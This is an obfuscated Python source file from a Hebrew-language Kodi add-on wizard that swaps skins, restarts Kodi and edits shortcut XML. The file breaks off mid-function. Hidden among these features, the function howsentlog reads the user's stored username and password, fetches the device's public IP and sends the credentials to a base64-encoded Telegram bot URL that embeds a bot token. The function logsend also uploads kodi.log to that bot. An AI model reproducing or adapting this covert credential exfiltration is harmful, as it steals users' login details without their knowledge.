# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	O000O0000OO00O000 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O000O0O0000O0OOOO =[];O0OO00000OO0O0000 =[]#line:261
	for OOO0O0OOOO000OO0O in sorted (O000O0000OO00O000 ,key =lambda O0OOOOOOOO0OOOO0O :O0OOOOOOOO0OOOO0O ):#line:262
		O000OOOOO0OOO00OO =os .path .split (OOO0O0OOOO000OO0O [:-1 ])[1 ]#line:263
		OOO0O0O000OO0O0O0 =os .path .join (OOO0O0OOOO000OO0O ,'addon.xml')#line:264
		if os .path .exists (OOO0O0O000OO0O0O0 ):#line:265
			OOO000O0OOO0O0OO0 =open (OOO0O0O000OO0O0O0 )#line:266
			OO000000O0O0O0O00 =OOO000O0OOO0O0OO0 .read ()#line:267
			OO0O00O0O00OO0000 =parseDOM2 (OO000000O0O0O0O00 ,'addon',ret ='id')#line:268
			O00000O00O0O0O000 =O000OOOOO0OOO00OO if len (OO0O00O0O00OO0000 )==0 else OO0O00O0O00OO0000 [0 ]#line:269
			try :#line:270
				OO0OO0O0OOOO000OO =xbmcaddon .Addon (id =O00000O00O0O0O000 )#line:271
				O000O0O0000O0OOOO .append (OO0OO0O0OOOO000OO .getAddonInfo ('name'))#line:272
				O0OO00000OO0O0000 .append (O00000O00O0O0O000 )#line:273
			except :#line:274
				pass #line:275
	O00OO0OOO0OO0OO00 =[];O000000OOO0O00O0O =0 #line:276
	OOO000OOOO0O0O0O0 =["Current Skin -- %s"%currSkin ()]+O000O0O0000O0OOOO #line:277
	O000000OOO0O00O0O =DIALOG .select ("Select the Skin you want to swap with.",OOO000OOOO0O0O0O0 )#line:278
	if O000000OOO0O00O0O ==-1 :return #line:279
	else :#line:280
		OO0OOO0000OO0O0O0 =(O000000OOO0O00O0O -1 )#line:281
		O00OO0OOO0OO0OO00 .append (OO0OOO0000OO0O0O0 )#line:282
		OOO000OOOO0O0O0O0 [O000000OOO0O00O0O ]="%s"%(O000O0O0000O0OOOO [OO0OOO0000OO0O0O0 ])#line:283
	if O00OO0OOO0OO0OO00 ==None :return #line:284
	for OO00OOO0000OO00O0 in O00OO0OOO0OO0OO00 :#line:285
		swapSkins (O0OO00000OO0O0000 [OO00OOO0000OO00O0 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (OO0O0OO0O0000O0O0 ,title ="Error"):#line:290
	OOOO0OOO0O0OO0O00 ='lookandfeel.skin'#line:291
	OOO0O0O00O0000000 =OO0O0OO0O0000O0O0 #line:292
	OO000OO00O0OOO000 =getOld (OOOO0OOO0O0OO0O00 )#line:293
	O00OO00000O0O00OO =OOOO0OOO0O0OO0O00 #line:294
	setNew (O00OO00000O0O00OO ,OOO0O0O00O0000000 )#line:295
	O0OO0O0OO0O0OOO0O =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO0O0OO0O0OOO0O <100 :#line:297
		O0OO0O0OO0O0OOO0O +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (O00OOO0000OO00000 ):#line:304
	try :#line:305
		O00OOO0000OO00000 ='"%s"'%O00OOO0000OO00000 #line:306
		OOOO0O0000O0000O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O00OOO0000OO00000 )#line:307
		OO000OO0OO0OO000O =xbmc .executeJSONRPC (OOOO0O0000O0000O0 )#line:309
		OO000OO0OO0OO000O =simplejson .loads (OO000OO0OO0OO000O )#line:310
		if OO000OO0OO0OO000O .has_key ('result'):#line:311
			if OO000OO0OO0OO000O ['result'].has_key ('value'):#line:312
				return OO000OO0OO0OO000O ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (OOOOOO00O0OO0OOOO ,O000000000OO00OOO ):#line:319
	try :#line:320
		OOOOOO00O0OO0OOOO ='"%s"'%OOOOOO00O0OO0OOOO #line:321
		O000000000OO00OOO ='"%s"'%O000000000OO00OOO #line:322
		O000OOOOO0OO00OOO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOOOOO00O0OO0OOOO ,O000000000OO00OOO )#line:323
		O00000O0O0O0O0O0O =xbmc .executeJSONRPC (O000OOOOO0OO00OOO )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			O00OO0OOO00O0O0OO =xbmcgui .DialogProgress ()#line:334
			O00OO0OOO00O0O0OO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			O00OO0OOO00O0O0OO .update (0 )#line:338
			for O00OOO00OO00O00O0 in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				O00OO0OOO00O0O0OO .update (int ((5 -O00OOO00OO00O00O0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O00OOO00OO00O00O0 ),'')#line:341
				if O00OO0OOO00O0O0OO .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			O00OO0OOO00O0O0OO =xbmcgui .DialogProgress ()#line:347
			O00OO0OOO00O0O0OO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			O00OO0OOO00O0O0OO .update (0 )#line:351
			for O00OOO00OO00O00O0 in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				O00OO0OOO00O0O0OO .update (int ((5 -O00OOO00OO00O00O0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O00OOO00OO00O00O0 ),'')#line:354
				if O00OO0OOO00O0O0OO .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:365
  wiz .kodi17Fix ()#line:366
def howsentlog ():#line:368
       try :#line:369
          import json #line:370
          O0OOO00O0OO000O0O =(ADDON .getSetting ("user"))#line:371
          OOOO00O00OO0000OO =(ADDON .getSetting ("pass"))#line:372
          O00O000OO00OO000O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:373
          OOO00OOOO000000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:375
          OO00OOO0OO000O00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:376
          OO0O0OO0O00OO000O =str (json .loads (OO00OOO0OO000O00O )['ip'])#line:377
          O0O0OOOO0OOO000OO =O0OOO00O0OO000O0O #line:378
          O0O0OO00O0O000O0O =OOOO00O00OO0000OO #line:379
          import socket #line:381
          OO00OOO0OO000O00O =urllib2 .urlopen (OOO00OOOO000000O0 .decode ('base64')+' - '+O0O0OOOO0OOO000OO +' - '+O0O0OO00O0O000O0O +' - '+O00O000OO00OO000O ).readlines ()#line:382
       except :pass #line:383
def googleindicat ():#line:386
			import logg #line:387
			OOO00O0O00OOO00O0 =(ADDON .getSetting ("pass"))#line:388
			OOO0O0O00OOO0OOOO =(ADDON .getSetting ("user"))#line:389
			logg .logGA (OOO00O0O00OOO00O0 ,OOO0O0O00OOO0OOOO )#line:390
def logsend ():#line:391
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:392
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:393
      howsentlog ()#line:395
      import requests #line:396
      if xbmc .getCondVisibility ('system.platform.windows'):#line:397
         O000O0OO0O00OO0OO =xbmc .translatePath ('special://home/kodi.log')#line:398
         OOO0O00000O00000O ={'chat_id':(None ,'-274262389'),'document':(O000O0OO0O00OO0OO ,open (O000O0OO0O00OO0OO ,'rb')),}#line:402
         O0O000OOO00OO0O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:403
         OO0OOOO0O0O0O000O =requests .post (O0O000OOO00OO0O00 .decode ('base64'),files =OOO0O00000O00000O )#line:405
      elif xbmc .getCondVisibility ('system.platform.android'):#line:406
           O000O0OO0O00OO0OO =xbmc .translatePath ('special://temp/kodi.log')#line:407
           OOO0O00000O00000O ={'chat_id':(None ,'-274262389'),'document':(O000O0OO0O00OO0OO ,open (O000O0OO0O00OO0OO ,'rb')),}#line:411
           O0O000OOO00OO0O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:412
           OO0OOOO0O0O0O000O =requests .post (O0O000OOO00OO0O00 .decode ('base64'),files =OOO0O00000O00000O )#line:414
      else :#line:415
           O000O0OO0O00OO0OO =xbmc .translatePath ('special://kodi.log')#line:416
           OOO0O00000O00000O ={'chat_id':(None ,'-274262389'),'document':(O000O0OO0O00OO0OO ,open (O000O0OO0O00OO0OO ,'rb')),}#line:420
           O0O000OOO00OO0O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:421
           OO0OOOO0O0O0O000O =requests .post (O0O000OOO00OO0O00 .decode ('base64'),files =OOO0O00000O00000O )#line:423
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:424
def rdoff ():#line:426
	resloginit .resloginit ('restore','all')#line:428
	OOOO0000O0000OO00 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:429
	OOOOOO0000O00O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:430
	copyfile (OOOO0000O0000OO00 ,OOOOOO0000O00O0OO )#line:431
def skindialogsettind18 ():#line:432
	try :#line:433
		O0000O0O00OOOO0OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:434
		O0OO00O00O0OO0O0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:435
		copyfile (O0000O0O00OOOO0OO ,O0OO00O00O0OO0O0O )#line:436
	except :pass #line:437
def rdon ():#line:438
	loginit .loginIt ('restore','all')#line:439
	OO0OO00O00OOO0O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:441
	OOOO0O0O0OO0OO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:442
	copyfile (OO0OO00O00OOO0O0O ,OOOO0O0O0OO0OO00O )#line:443
def adults18 ():#line:445
  O0OOO0000OOOO0O00 =(ADDON .getSetting ("adults"))#line:446
  if O0OOO0000OOOO0O00 =='true':#line:447
    OOOOOO0OO00O00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:448
    with open (OOOOOO0OO00O00O00 ,'r')as OOO0O0O0000OO000O :#line:449
      O0OOO0000O0O00OOO =OOO0O0O0000OO000O .read ()#line:450
    O0OOO0000O0O00OOO =O0OOO0000O0O00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:468
    with open (OOOOOO0OO00O00O00 ,'w')as OOO0O0O0000OO000O :#line:471
      OOO0O0O0000OO000O .write (O0OOO0000O0O00OOO )#line:472
def rdbuildaddon ():#line:473
  O0OO0O000O0OOOOO0 =(ADDON .getSetting ("rdbuild"))#line:474
  if O0OO0O000O0OOOOO0 =='true':#line:475
    O0O0O000OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:476
    with open (O0O0O000OO000000O ,'r')as OO0O000O0OO00OOO0 :#line:477
      O0OOOO0OOOO0O0OO0 =OO0O000O0OO00OOO0 .read ()#line:478
    O0OOOO0OOOO0O0OO0 =O0OOOO0OOOO0O0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:496
    with open (O0O0O000OO000000O ,'w')as OO0O000O0OO00OOO0 :#line:499
      OO0O000O0OO00OOO0 .write (O0OOOO0OOOO0O0OO0 )#line:500
    O0O0O000OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:504
    with open (O0O0O000OO000000O ,'r')as OO0O000O0OO00OOO0 :#line:505
      O0OOOO0OOOO0O0OO0 =OO0O000O0OO00OOO0 .read ()#line:506
    O0OOOO0OOOO0O0OO0 =O0OOOO0OOOO0O0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:524
    with open (O0O0O000OO000000O ,'w')as OO0O000O0OO00OOO0 :#line:527
      OO0O000O0OO00OOO0 .write (O0OOOO0OOOO0O0OO0 )#line:528
    O0O0O000OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:532
    with open (O0O0O000OO000000O ,'r')as OO0O000O0OO00OOO0 :#line:533
      O0OOOO0OOOO0O0OO0 =OO0O000O0OO00OOO0 .read ()#line:534
    O0OOOO0OOOO0O0OO0 =O0OOOO0OOOO0O0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:552
    with open (O0O0O000OO000000O ,'w')as OO0O000O0OO00OOO0 :#line:555
